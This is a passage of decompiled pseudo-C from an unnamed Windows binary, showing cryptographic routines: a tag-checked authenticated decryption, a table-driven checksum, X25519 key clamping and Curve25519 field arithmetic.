  _QWORD v17[4]; // [rsp+40h] [rbp-C0h] BYREF
  _BYTE v18[80]; // [rsp+60h] [rbp-A0h] BYREF
  _BYTE v19[192]; // [rsp+B0h] [rbp-50h] BYREF

  memset(v17, 0, sizeof(v17));
  sub_14000CD00((__int64)v19, a8, a7, 0);
  sub_14000CD60((__int64)v19, (__int64)v17, 0x20u);
  sub_140017030(v18, v17);
  if ( a4 != 0 && a5 != 0 )
  {
    sub_1400170B0(v18, a4, a5);
    if ( (a5 & 0xF) != 0 )
    {
      v15 = 0;
      sub_1400170B0(v18, &v15, 16 - (a5 & 0xF));
    }
  }
  sub_1400170B0(v18, a2, a3);
  if ( (a3 & 0xF) != 0 )
  {
    v15 = 0;
    sub_1400170B0(v18, &v15, 16 - (a3 & 0xF));
  }
  *(_QWORD *)&v15 = a5;
  *((_QWORD *)&v15 + 1) = a3;
  sub_1400170B0(v18, &v15, 16);
  sub_140017400(v18, v16);
  v12 = _mm_or_ps(
          _mm_or_ps(
            (__m128)_mm_unpacklo_epi16(
                      _mm_unpacklo_epi8(
                        (__m128i)_mm_xor_ps((__m128)_mm_cvtsi32_si128(a6[3]), (__m128)_mm_cvtsi32_si128(v16[3])),
                        (__m128i)0LL),
                      (__m128i)0LL),
            _mm_or_ps(
              (__m128)_mm_unpacklo_epi16(
                        _mm_unpacklo_epi8(
                          (__m128i)_mm_xor_ps((__m128)_mm_cvtsi32_si128(a6[2]), (__m128)_mm_cvtsi32_si128(v16[2])),
                          (__m128i)0LL),
                        (__m128i)0LL),
              (__m128)_mm_unpacklo_epi16(
                        _mm_unpacklo_epi8(
                          (__m128i)_mm_xor_ps((__m128)_mm_cvtsi32_si128(a6[1]), (__m128)_mm_cvtsi32_si128(v16[1])),
                          (__m128i)0LL),
                        (__m128i)0LL))),
          (__m128)_mm_unpacklo_epi16(
                    _mm_unpacklo_epi8(
                      (__m128i)_mm_xor_ps((__m128)_mm_cvtsi32_si128(*a6), (__m128)_mm_cvtsi32_si128(v16[0])),
                      (__m128i)0LL),
                    (__m128i)0LL));
  v13 = _mm_or_ps(v12, (__m128)_mm_srli_si128((__m128i)v12, 8));
  if ( _mm_cvtsi128_si32((__m128i)_mm_or_ps(v13, (__m128)_mm_srli_si128((__m128i)v13, 4))) != 0 )
    return 0xFFFFFFFFLL;
  sub_14000CD00((__int64)v19, a8, a7, 1);
  sub_140022A10(a1, a2, a3);
  sub_14000CD60((__int64)v19, a1, a3);
  return 0;
}


// ----- sub_14000D720 @ 0x14000d720 -----
void __fastcall sub_14000D720(_QWORD *a1, __int64 a2)
{
  *a1 = a2;
}


// ----- sub_14000D730 @ 0x14000d730 -----
__int64 __fastcall sub_14000D730(unsigned __int8 *a1, int a2)
{
  __int64 result; // rax
  __int64 v3; // r8

  for ( result = 1735290724; a2 != 0; --a2 )
  {
    v3 = *a1++;
    result = (unsigned int)(*((_DWORD *)qword_140001AE0 + (v3 ^ ((unsigned __int64)(unsigned int)result >> 24)))
                          ^ ((_DWORD)result << 8));
  }
  return result;
}


// ----- sub_14000D760 @ 0x14000d760 -----
__int64 __fastcall sub_14000D760(__int64 a1, __int64 a2, __int64 a3)
{
  __int128 v4; // xmm1
  char v5; // al
  __int64 v6; // rax
  __int64 v8; // [rsp+20h] [rbp-E0h] BYREF
  __int64 v9; // [rsp+28h] [rbp-D8h]
  __int64 v10; // [rsp+30h] [rbp-D0h]
  __int64 v11; // [rsp+38h] [rbp-C8h]
  __int64 v12; // [rsp+40h] [rbp-C0h]
  __int64 v13; // [rsp+48h] [rbp-B8h]
  __int64 v14; // [rsp+50h] [rbp-B0h]
  __int64 v15; // [rsp+58h] [rbp-A8h]
  __int64 v16; // [rsp+60h] [rbp-A0h]
  __int64 v17; // [rsp+70h] [rbp-90h]
  __int64 v18; // [rsp+78h] [rbp-88h]
  __int64 v19; // [rsp+80h] [rbp-80h]
  __int64 v20; // [rsp+88h] [rbp-78h]
  __int64 v21; // [rsp+90h] [rbp-70h]
  __int64 v22; // [rsp+98h] [rbp-68h]
  __int64 v23; // [rsp+A0h] [rbp-60h]
  __int64 v24; // [rsp+A8h] [rbp-58h]
  __int64 v25; // [rsp+B0h] [rbp-50h]
  __m128i v26; // [rsp+C0h] [rbp-40h] BYREF
  __int128 v27; // [rsp+D0h] [rbp-30h]
  _BYTE v28[96]; // [rsp+E0h] [rbp-20h] BYREF
  _BYTE v29[80]; // [rsp+140h] [rbp+40h] BYREF
  _BYTE v30[80]; // [rsp+190h] [rbp+90h] BYREF
  _BYTE v31[80]; // [rsp+1E0h] [rbp+E0h] BYREF

  v4 = *(_OWORD *)(a2 + 16);
  v5 = _mm_cvtsi128_si32(*(__m128i *)a2);
  v26 = *(__m128i *)a2;
  v26.m128i_i8[0] = v5 & 0xF8;
  v6 = *(_QWORD *)(a2 + 24);
  v27 = v4;
  HIBYTE(v27) = HIBYTE(v6) & 0x3F | 0x40;
  sub_14000E790(v29, a3);
  sub_14000FF90(v31, v28, &v26, v29);
  sub_1400103A0(v30, v28);
  sub_14000D9F0(&v8, v31, v30);
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  v10 += 19 * v19;
  v9 += 19 * v18;
  v8 += 19 * v17;
  sub_14000E0C0(&v8);
  sub_140016F80(v28, &v8, 80);
  sub_14000E9E0(a1, v28);
  return 0;
}


// ----- sub_14000D9F0 @ 0x14000d9f0 -----
__int64 __fastcall sub_14000D9F0(_QWORD *a1, int *a2, int *a3)
{
  __int64 result; // rax

  *a1 = *a3 * (__int64)*a2;
  a1[1] = *a3 * (__int64)a2[2] + *a2 * (__int64)a3[2];
  a1[2] = *a3 * (__int64)a2[4] + *a2 * (__int64)a3[4] + 2 * a3[2] * (__int64)a2[2];
  a1[3] = *a3 * (__int64)a2[6] + *a2 * (__int64)a3[6] + a3[2] * (__int64)a2[4] + a3[4] * (__int64)a2[2];
  a1[4] = *a3 * (__int64)a2[8]
        + *a2 * (__int64)a3[8]
        + a3[4] * (__int64)a2[4]
        + 2 * (a3[2] * (__int64)a2[6] + a3[6] * (__int64)a2[2]);
  a1[5] = *a3 * (__int64)a2[10]
        + *a2 * (__int64)a3[10]
        + a3[2] * (__int64)a2[8]
        + a3[4] * (__int64)a2[6]
        + a3[6] * (__int64)a2[4]
        + a2[2] * (__int64)a3[8];
  a1[6] = *a3 * (__int64)a2[12]
        + *a2 * (__int64)a3[12]
        + a3[4] * (__int64)a2[8]
        + a3[8] * (__int64)a2[4]
        + 2 * (a3[2] * (__int64)a2[10] + a3[6] * (__int64)a2[6] + a2[2] * (__int64)a3[10]);
  a1[7] = *a3 * (__int64)a2[14]
        + *a2 * (__int64)a3[14]
        + a3[2] * (__int64)a2[12]
        + a3[4] * (__int64)a2[10]
        + a3[6] * (__int64)a2[8]
        + a2[2] * (__int64)a3[12]
        + a3[8] * (__int64)a2[6]
        + a2[4] * (__int64)a3[10];
  a1[8] = *a3 * (__int64)a2[16]
        + *a2 * (__int64)a3[16]
        + a3[4] * (__int64)a2[12]
        + a3[8] * (__int64)a2[8]
        + a2[4] * (__int64)a3[12]
        + 2 * (a3[2] * (__int64)a2[14] + a2[2] * (__int64)a3[14] + a3[6] * (__int64)a2[10] + a3[10] * (__int64)a2[6]);
  a1[9] = *a3 * (__int64)a2[18]
        + *a2 * (__int64)a3[18]
        + a3[2] * (__int64)a2[16]
        + a3[4] * (__int64)a2[14]
        + a3[6] * (__int64)a2[12]
        + a2[2] * (__int64)a3[16]
        + a3[8] * (__int64)a2[10]
        + a2[4] * (__int64)a3[14]
        + a3[10] * (__int64)a2[8]
        + a2[6] * (__int64)a3[12];
  a1[10] = a3[4] * (__int64)a2[16]
         + a3[8] * (__int64)a2[12]
         + a2[4] * (__int64)a3[16]
         + a3[12] * (__int64)a2[8]
         + 2
         * (a3[2] * (__int64)a2[18]
          + a2[2] * (__int64)a3[18]
          + a3[6] * (__int64)a2[14]
          + a3[10] * (__int64)a2[10]
          + a2[6] * (__int64)a3[14]);
  a1[11] = a3[4] * (__int64)a2[18]
         + a3[6] * (__int64)a2[16]
         + a3[8] * (__int64)a2[14]
         + a2[4] * (__int64)a3[18]
         + a3[10] * (__int64)a2[12]
         + a2[6] * (__int64)a3[16]
         + a3[12] * (__int64)a2[10]
         + a2[8] * (__int64)a3[14];
  a1[12] = a3[8] * (__int64)a2[16]
         + a3[12] * (__int64)a2[12]
         + a2[8] * (__int64)a3[16]
         + 2 * (a3[6] * (__int64)a2[18] + a2[6] * (__int64)a3[18] + a3[10] * (__int64)a2[14] + a3[14] * (__int64)a2[10]);
  a1[13] = a3[8] * (__int64)a2[18]
         + a3[10] * (__int64)a2[16]
         + a3[12] * (__int64)a2[14]
         + a2[8] * (__int64)a3[18]
         + a3[14] * (__int64)a2[12]
         + a2[10] * (__int64)a3[16];
  a1[14] = a3[12] * (__int64)a2[16]
         + a3[16] * (__int64)a2[12]
         + 2 * (a3[10] * (__int64)a2[18] + a3[14] * (__int64)a2[14] + a2[10] * (__int64)a3[18]);
  a1[15] = a3[12] * (__int64)a2[18] + a3[14] * (__int64)a2[16] + a2[12] * (__int64)a3[18] + a3[16] * (__int64)a2[14];
  a1[16] = a3[16] * (__int64)a2[16] + 2 * (a3[14] * (__int64)a2[18] + a3[18] * (__int64)a2[14]);
  a1[17] = a3[16] * (__int64)a2[18] + a3[18] * (__int64)a2[16];
  result = a3[18];
  a1[18] = 2 * result * a2[18];
  return result;
}


// ----- sub_14000E080 @ 0x14000e080 -----
__int64 __fastcall sub_14000E080(__int64 a1)
{
  return (__int64)(a1 + ((unsigned __int64)(unsigned int)(SHIDWORD(a1) >> 31) >> 6)) >> 26;
}


// ----- sub_14000E0A0 @ 0x14000e0a0 -----
__int64 __fastcall sub_14000E0A0(__int64 a1)
{
  return (__int64)(a1 + ((unsigned __int64)(unsigned int)(SHIDWORD(a1) >> 31) >> 7)) >> 25;
}


// ----- sub_14000E0C0 @ 0x14000e0c0 -----
unsigned __int64 __fastcall sub_14000E0C0(__int64 *a1)
{
  __int64 v1; // r9
  signed __int64 v3; // r8
  __int64 v4; // r11
  __int64 v5; // rdx
  __int64 v6; // rax
  __int64 v7; // rdx
  __int64 v8; // rax
  __int64 v9; // rdx
  __int64 v10; // rax
  __int64 v11; // rdx
  __int64 v12; // rax
  __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // rdx
  __int64 v16; // rax
  __int64 v17; // rdx
  __int64 v18; // rax
  __int64 v19; // rdx
  __int64 v20; // rax
  unsigned __int64 v21; // rcx
  __int64 v22; // rax
  __int64 v23; // rdx
  unsigned __int64 result; // rax

  v1 = *a1;
  v3 = *a1 + ((unsigned __int64)(unsigned int)((int)HIDWORD(*a1) >> 31) >> 6);
  v4 = (v3 >> 26) + a1[1];
  v5 = ((__int64)(v4 + ((unsigned __int64)(unsigned int)(SHIDWORD(v4) >> 31) >> 7)) >> 25) + a1[2];
  v6 = v5 + ((unsigned __int64)(unsigned int)(SHIDWORD(v5) >> 31) >> 6);
  a1[2] = v5 - (v6 & 0xFFFFFFFFFC000000uLL);
  v7 = (v6 >> 26) + a1[3];
  v8 = v7 + ((unsigned __int64)(unsigned int)(SHIDWORD(v7) >> 31) >> 7);
  a1[3] = v7 - (v8 & 0xFFFFFFFFFE000000uLL);
  v9 = (v8 >> 25) + a1[4];
  v10 = v9 + ((unsigned __int64)(unsigned int)(SHIDWORD(v9) >> 31) >> 6);
  a1[4] = v9 - (v10 & 0xFFFFFFFFFC000000uLL);
  v11 = (v10 >> 26) + a1[5];
  v12 = v11 + ((unsigned __int64)(unsigned int)(SHIDWORD(v11) >> 31) >> 7);
  a1[5] = v11 - (v12 & 0xFFFFFFFFFE000000uLL);
  v13 = (v12 >> 25) + a1[6];
  v14 = v13 + ((unsigned __int64)(unsigned int)(SHIDWORD(v13) >> 31) >> 6);
  a1[6] = v13 - (v14 & 0xFFFFFFFFFC000000uLL);
  v15 = (v14 >> 26) + a1[7];
  v16 = v15 + ((unsigned __int64)(unsigned int)(SHIDWORD(v15) >> 31) >> 7);
  a1[7] = v15 - (v16 & 0xFFFFFFFFFE000000uLL);
  v17 = (v16 >> 25) + a1[8];
  v18 = v17 + ((unsigned __int64)(unsigned int)(SHIDWORD(v17) >> 31) >> 6);
  a1[8] = v17 - (v18 & 0xFFFFFFFFFC000000uLL);
  v19 = (v18 >> 26) + a1[9];
  v20 = v19 + ((unsigned __int64)(unsigned int)(SHIDWORD(v19) >> 31) >> 7);
  a1[9] = v19 - (v20 & 0xFFFFFFFFFE000000uLL);
  a1[10] = 0;
  v21 = v1 - (v3 & 0xFFFFFFFFFC000000uLL) + 19 * (v20 >> 25);
  v22 = v21 + ((unsigned __int64)(unsigned int)(SHIDWORD(v21) >> 31) >> 6);
  v23 = v22 >> 26;
  result = v22 & 0xFFFFFFFFFC000000uLL;
  a1[1] = v23 + v4 - ((v4 + ((unsigned __int64)(unsigned int)(SHIDWORD(v4) >> 31) >> 7)) & 0xFFFFFFFFFE000000uLL);
  *a1 = v21 - result;
  return result;
}


// ----- sub_14000E2C0 @ 0x14000e2c0 -----
__int64 __fastcall sub_14000E2C0(__int64 a1, int *a2, int *a3)
{
  __int64 v5; // [rsp+20h] [rbp-49h] BYREF
  __int64 v6; // [rsp+28h] [rbp-41h]
  __int64 v7; // [rsp+30h] [rbp-39h]
  __int64 v8; // [rsp+38h] [rbp-31h]
  __int64 v9; // [rsp+40h] [rbp-29h]
  __int64 v10; // [rsp+48h] [rbp-21h]
  __int64 v11; // [rsp+50h] [rbp-19h]
  __int64 v12; // [rsp+58h] [rbp-11h]
  __int64 v13; // [rsp+60h] [rbp-9h]
  __int64 v14; // [rsp+70h] [rbp+7h]
  __int64 v15; // [rsp+78h] [rbp+Fh]
  __int64 v16; // [rsp+80h] [rbp+17h]
  __int64 v17; // [rsp+88h] [rbp+1Fh]
  __int64 v18; // [rsp+90h] [rbp+27h]
  __int64 v19; // [rsp+98h] [rbp+2Fh]
  __int64 v20; // [rsp+A0h] [rbp+37h]
  __int64 v21; // [rsp+A8h] [rbp+3Fh]
  __int64 v22; // [rsp+B0h] [rbp+47h]

  sub_14000D9F0(&v5, a2, a3);
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  v10 += 19 * v19;
  v9 += 19 * v18;
  v8 += 19 * v17;
  v7 += 19 * v16;
  v6 += 19 * v15;
  v5 += 19 * v14;
  sub_14000E0C0(&v5);
  return sub_140016F80(a1, &v5, 80);
}


// ----- sub_14000E370 @ 0x14000e370 -----
__int64 __fastcall sub_14000E370(_QWORD *a1, int *a2)
{
  __int64 result; // rax

  *a1 = *a2 * (__int64)*a2;
  a1[1] = 2 * *a2 * (__int64)a2[2];
  a1[2] = 2 * (a2[2] * (__int64)a2[2] + *a2 * (__int64)a2[4]);
  a1[3] = 2 * (*a2 * (__int64)a2[6] + a2[2] * (__int64)a2[4]);
  a1[4] = a2[4] * (__int64)a2[4] + 2 * (*a2 * (__int64)a2[8] + 2 * a2[2] * (__int64)a2[6]);
  a1[5] = 2 * (*a2 * (__int64)a2[10] + a2[2] * (__int64)a2[8] + a2[4] * (__int64)a2[6]);
  a1[6] = 2 * (a2[6] * (__int64)a2[6] + *a2 * (__int64)a2[12] + a2[4] * (__int64)a2[8] + 2 * a2[2] * (__int64)a2[10]);
  a1[7] = 2 * (*a2 * (__int64)a2[14] + a2[2] * (__int64)a2[12] + a2[4] * (__int64)a2[10] + a2[6] * (__int64)a2[8]);
  a1[8] = a2[8] * (__int64)a2[8]
        + 2
        * (*a2 * (__int64)a2[16] + a2[4] * (__int64)a2[12] + 2 * (a2[2] * (__int64)a2[14] + a2[6] * (__int64)a2[10]));
  a1[9] = 2
        * (*a2 * (__int64)a2[18]
         + a2[2] * (__int64)a2[16]
         + a2[4] * (__int64)a2[14]
         + a2[6] * (__int64)a2[12]
         + a2[8] * (__int64)a2[10]);
  a1[10] = 2
         * (a2[10] * (__int64)a2[10]
          + a2[4] * (__int64)a2[16]
          + a2[8] * (__int64)a2[12]
          + 2 * (a2[2] * (__int64)a2[18] + a2[6] * (__int64)a2[14]));
  a1[11] = 2 * (a2[4] * (__int64)a2[18] + a2[6] * (__int64)a2[16] + a2[8] * (__int64)a2[14] + a2[10] * (__int64)a2[12]);
  a1[12] = a2[12] * (__int64)a2[12]
         + 2 * (a2[8] * (__int64)a2[16] + 2 * (a2[6] * (__int64)a2[18] + a2[10] * (__int64)a2[14]));
  a1[13] = 2 * (a2[8] * (__int64)a2[18] + a2[10] * (__int64)a2[16] + a2[12] * (__int64)a2[14]);
  a1[14] = 2 * (a2[14] * (__int64)a2[14] + a2[12] * (__int64)a2[16] + 2 * a2[10] * (__int64)a2[18]);
  a1[15] = 2 * (a2[12] * (__int64)a2[18] + a2[14] * (__int64)a2[16]);
  a1[16] = a2[16] * (__int64)a2[16] + 4 * a2[14] * (__int64)a2[18];
  a1[17] = 2 * a2[18] * (__int64)a2[16];
  result = 2 * a2[18] * (__int64)a2[18];
  a1[18] = result;
  return result;
}


// ----- sub_14000E6E0 @ 0x14000e6e0 -----
__int64 __fastcall sub_14000E6E0(__int64 a1, int *a2)
{
  __int64 v4; // [rsp+20h] [rbp-49h] BYREF
  __int64 v5; // [rsp+28h] [rbp-41h]
  __int64 v6; // [rsp+30h] [rbp-39h]
  __int64 v7; // [rsp+38h] [rbp-31h]
  __int64 v8; // [rsp+40h] [rbp-29h]
  __int64 v9; // [rsp+48h] [rbp-21h]
  __int64 v10; // [rsp+50h] [rbp-19h]
  __int64 v11; // [rsp+58h] [rbp-11h]
  __int64 v12; // [rsp+60h] [rbp-9h]
  __int64 v13; // [rsp+70h] [rbp+7h]
  __int64 v14; // [rsp+78h] [rbp+Fh]
  __int64 v15; // [rsp+80h] [rbp+17h]
  __int64 v16; // [rsp+88h] [rbp+1Fh]
  __int64 v17; // [rsp+90h] [rbp+27h]
  __int64 v18; // [rsp+98h] [rbp+2Fh]
  __int64 v19; // [rsp+A0h] [rbp+37h]
  __int64 v20; // [rsp+A8h] [rbp+3Fh]
  __int64 v21; // [rsp+B0h] [rbp+47h]

  sub_14000E370(&v4, a2);
  v12 += 19 * v21;
  v11 += 19 * v20;
  v10 += 19 * v19;
  v9 += 19 * v18;
  v8 += 19 * v17;
  v7 += 19 * v16;
  v6 += 19 * v15;
  v5 += 19 * v14;
  v4 += 19 * v13;
  sub_14000E0C0(&v4);
  return sub_140016F80(a1, &v4, 80);
}


// ----- sub_14000E790 @ 0x14000e790 -----
unsigned __int64 __fastcall sub_14000E790(unsigned __int64 *a1, unsigned __int8 *a2)
{
  unsigned __int64 result; // rax

  *a1 = ((unsigned __int64)a2[1] << 8) | *a2 | (*((unsigned __int16 *)a2 + 1) << 16) & 0x3FFFFFFu;
  a1[1] = ((unsigned __int64)a2[3] >> 2) | ((a2[4] | ((unsigned __int64)(*(_WORD *)(a2 + 5) & 0x7FF) << 8)) << 6);
  a1[2] = ((unsigned __int64)a2[6] >> 3) | (32 * (a2[7] | ((unsigned __int64)(*((_WORD *)a2 + 4) & 0x1FFF) << 8)));
  a1[3] = ((unsigned __int64)a2[9] >> 5) | (8 * (a2[10] | ((unsigned __int64)(*(_WORD *)(a2 + 11) & 0x3FFF) << 8)));
  a1[4] = ((unsigned __int64)a2[12] >> 6) | (4 * (a2[13] | ((unsigned __int64)*((unsigned __int16 *)a2 + 7) << 8)));
  a1[5] = ((unsigned __int64)a2[17] << 8) | a2[16] | (*((unsigned __int16 *)a2 + 9) << 16) & 0x1FFFFFFu;
  a1[6] = ((unsigned __int64)a2[19] >> 1) | ((a2[20] | ((unsigned __int64)(*(_WORD *)(a2 + 21) & 0x7FF) << 8)) << 7);
  a1[7] = ((unsigned __int64)a2[22] >> 3) | (32 * (a2[23] | ((unsigned __int64)(*((_WORD *)a2 + 12) & 0xFFF) << 8)));
  a1[8] = ((unsigned __int64)a2[25] >> 4) | (16 * (a2[26] | ((unsigned __int64)(*(_WORD *)(a2 + 27) & 0x3FFF) << 8)));
  result = (unsigned __int64)a2[28] >> 6;
  a1[9] = result | (4 * (a2[29] | ((unsigned __int64)(*((_WORD *)a2 + 15) & 0x7FFF) << 8)));
  return result;
}


// ----- sub_14000E9E0 @ 0x14000e9e0 -----
__int64 __fastcall sub_14000E9E0(_BYTE *a1, int *a2)
{
  int v2; // r8d
  int v3; // r11d
  int v4; // r9d
  int v5; // edi
  int v6; // ecx
  int v7; // r14d
  int v8; // ebx
  int v9; // r15d
  int v10; // esi
  int v11; // ebp
  int v12; // r12d
  int v13; // edx
  int v14; // r8d
  int v15; // r9d
  int v16; // r10d
  int v17; // r11d
  int v18; // r13d
  int v19; // ebx
  int v20; // r12d
  int v21; // edi
  int v22; // r15d
  int v23; // r14d
  int v24; // ebp
  int v25; // ecx
  int v26; // ebp
  int v27; // r15d
  int v28; // edx
  int v29; // r8d
  int v30; // r9d
  int v31; // r10d
  int v32; // r11d
  int v33; // ebx
  int v34; // edi
  int v35; // r14d
  int v36; // ebp
  int v37; // r12d
  int v38; // esi
  int v39; // r15d
  int v40; // r13d
  int v41; // ecx
  int v42; // r13d
  int v43; // r9d
  int v44; // r10d
  int v45; // r11d
  int v46; // r15d
  int v47; // eax
  int v48; // ebx
  int v49; // r12d
  int v50; // edx
  int v51; // esi
  int v52; // ecx
  int v53; // r14d
  int v54; // esi
  int v55; // edi
  int v56; // ebp
  int v57; // r10d
  int v58; // r8d
  int v59; // eax
  int v60; // ebx
  int v61; // r10d
  int v62; // ebx
  int v63; // r10d
  int v64; // eax
  int v65; // ecx
  int v66; // r9d
  int v67; // r11d
  int v68; // esi
  int v69; // r8d
  int v70; // edi
  int v71; // ebp
  int v72; // edx
  int v73; // ebx
  __int64 result; // rax
  int v75; // [rsp+0h] [rbp-68h]
  int v76; // [rsp+0h] [rbp-68h]
  int v77; // [rsp+4h] [rbp-64h]
  int v78; // [rsp+4h] [rbp-64h]
  int v79; // [rsp+8h] [rbp-60h]
  int v80; // [rsp+8h] [rbp-60h]
  int v81; // [rsp+Ch] [rbp-5Ch]
  int v82; // [rsp+10h] [rbp-58h]
  int v83; // [rsp+10h] [rbp-58h]
  int v84; // [rsp+14h] [rbp-54h]
  int v85; // [rsp+14h] [rbp-54h]
  int v86; // [rsp+18h] [rbp-50h]
  int v87; // [rsp+18h] [rbp-50h]
  int v88; // [rsp+1Ch] [rbp-4Ch]
  int v89; // [rsp+1Ch] [rbp-4Ch]
  int v90; // [rsp+20h] [rbp-48h]
  int v91; // [rsp+20h] [rbp-48h]
  int v92; // [rsp+24h] [rbp-44h]
  int v93; // [rsp+24h] [rbp-44h]
  int v94; // [rsp+28h] [rbp-40h]
  int v95; // [rsp+2Ch] [rbp-3Ch]
  int v97; // [rsp+80h] [rbp+18h]
  int v98; // [rsp+80h] [rbp+18h]
  int v99; // [rsp+80h] [rbp+18h]
  int v100; // [rsp+88h] [rbp+20h]
  int v101; // [rsp+88h] [rbp+20h]
  int v102; // [rsp+88h] [rbp+20h]

  v2 = (*a2 >> 26) & (*a2 >> 31);
  v3 = v2 + a2[2];
  v4 = (v3 >> 25) & (v3 >> 31);
  v5 = v4 + a2[4];
  v6 = (v5 >> 26) & (v5 >> 31);
  v7 = v6 + a2[6];
  v8 = (v7 >> 25) & (v7 >> 31);
  v9 = v8 + a2[8];
  v10 = (v9 >> 26) & (v9 >> 31);
  v100 = v10 + a2[10];
  v11 = (v100 >> 25) & (v100 >> 31);
  v75 = v11 + a2[12];
  v12 = (v75 >> 26) & (v75 >> 31);
  v95 = v12 + a2[14];
  v94 = (v95 >> 25) & (v95 >> 31);
  v79 = a2[16] + v94;
  v77 = (v79 >> 26) & (v79 >> 31);
  v97 = v77 + a2[18];
  v81 = (v97 >> 25) & (v97 >> 31);
  v82 = *a2 - (v2 << 26) + 19 * v81;
  v13 = (v82 >> 26) & (v82 >> 31);
  v86 = v13 + v3 - (v4 << 25);
  v84 = (v86 >> 25) & (v86 >> 31);
  v88 = v84 + v5 - (v6 << 26);
  v14 = (v88 >> 26) & (v88 >> 31);
  v90 = v7 - (v8 << 25) + v14;
  v15 = (v90 >> 25) & (v90 >> 31);
  v92 = v9 - (v10 << 26) + v15;
  v16 = (v92 >> 26) & (v92 >> 31);
  v101 = v16 + v100 - (v11 << 25);
  v17 = (v101 >> 25) & (v101 >> 31);
  v18 = v17 + v75 - (v12 << 26);
  v19 = (v18 >> 26) & (v18 >> 31);
  v20 = v19 + v95 - (v94 << 25);
  v21 = (v20 >> 25) & (v20 >> 31);
  v22 = v21 + v79 - (v77 << 26);
  v98 = ((v22 >> 26) & (v22 >> 31)) - (v81 << 25) + v97;
  v23 = (v98 >> 25) & (v98 >> 31);
  v24 = v82 - (v13 << 26) + 19 * v23;
  v25 = (v24 >> 26) & (v24 >> 31);
  v26 = v24 - (v25 << 26);
  v27 = v22 - (((v22 >> 26) & (v22 >> 31)) << 26);
  v28 = v86 - (v84 << 25) + v25 + (v26 >> 26);
  v29 = v88 - (v14 << 26) + (v28 >> 25);
  v30 = v90 - (v15 << 25) + (v29 >> 26);
  v31 = v92 - (v16 << 26) + (v30 >> 25);
  v32 = v101 - (v17 << 25) + (v31 >> 26);
  v33 = v18 - (v19 << 26) + (v32 >> 25);
  v34 = v20 - (v21 << 25) + (v33 >> 26);
  v35 = ((v27 + (v34 >> 25)) >> 26) - (v23 << 25) + v98;
  v36 = 19 * (v35 >> 25) + (v26 & 0x3FFFFFF);
  v37 = (v28 & 0x1FFFFFF) + (v36 >> 26);
  v38 = (v27 + (v34 >> 25)) & 0x3FFFFFF;
  v91 = v37 & 0x1FFFFFF;
  v39 = (v37 >> 25) + (v29 & 0x3FFFFFF);
  v89 = v39 & 0x3FFFFFF;
  v40 = (v39 >> 26) + (v30 & 0x1FFFFFF);
  v41 = v40 >> 25;
  v87 = v40 & 0x1FFFFFF;
  v42 = v40 & 0x1FFFFFF ^ 0x1FFFFFF;
  v43 = v41 + (v31 & 0x3FFFFFF);
  v85 = v43 & 0x3FFFFFF;
  v44 = (v43 >> 26) + (v32 & 0x1FFFFFF);
  v45 = v39 & 0x3FFFFFF ^ 0x3FFFFFF;
  v93 = v44 & 0x1FFFFFF;
  v46 = v44 & 0x1FFFFFF ^ 0x1FFFFFF;
  v102 = v45;
  v47 = (v44 >> 25) + (v33 & 0x3FFFFFF);
  v48 = v37 & 0x1FFFFFF ^ 0x1FFFFFF;
  v83 = v47 & 0x3FFFFFF;
  v49 = v43 & 0x3FFFFFF ^ 0x3FFFFFF;
  v99 = v48;
  v50 = (v47 >> 26) + (v34 & 0x1FFFFFF);
  v51 = v38 + (v50 >> 25);
  v52 = (v35 & 0x1FFFFFF) + (v51 >> 26);
  v80 = v51 & 0x3FFFFFF;
  v53 = v47 & 0x3FFFFFF ^ 0x3FFFFFF;
  v78 = v52 & 0x1FFFFFF;
  v54 = v51 & 0x3FFFFFF ^ 0x3FFFFFF;
  v55 = v52 & 0x1FFFFFF ^ 0x1FFFFFF;
  v76 = (v36 & 0x3FFFFFF) + 19 * (v52 >> 25);
  v56 = v50 & 0x1FFFFFF ^ 0x1FFFFFF;
  v57 = (~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v45 | v48) << 16)
      & ((~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v45 | v48)
        & (~(v48 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)) << 8)
      & (16
       * (~v55
        & (~(v48 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)
        & ((~(v48 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55)
          & (~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v45 | v48) << 16)) << 8)));
  v58 = v48;
  v59 = v48 | v45;
  v60 = 2
      * (v57
       & (4
        * ((~(v48 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)
         & ((~(v48 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55)
           & (~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v45 | v48) << 16)) << 8)
         & (16
          * (~(v48 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55)
           & (~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v45 | v48) << 16)
           & ((~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v45 | v48)
             & (~(v48 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)) << 8))))));
  v61 = (~(v59 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)
      & ((~(v58 | v45 | v42 | v49 | v46 | v53 | v56 | v54 | v55)
        & (~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v45 | v58) << 16)) << 8)
      & (16
       * ((~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v102 | v58) << 16)
        & ((~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v102 | v99)
          & (~(v99 | v102 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)) << 8)));
  v62 = ~((v76 - 67108845) >> 31)
      & ((v61
        & (4
         * ((~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v102 | v99) << 16)
          & ((~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v102 | v99)
            & (~(v99 | v102 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)) << 8)
          & (16
           * (~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v102 | v99)
            & (~(v99 | v102 | v42 | v49 | v46 | v53 | v56 | v54 | v55) << 16)
            & ((~(v99 | v102 | v42 | v49 | v46 | v53 | v56 | v54 | v55)
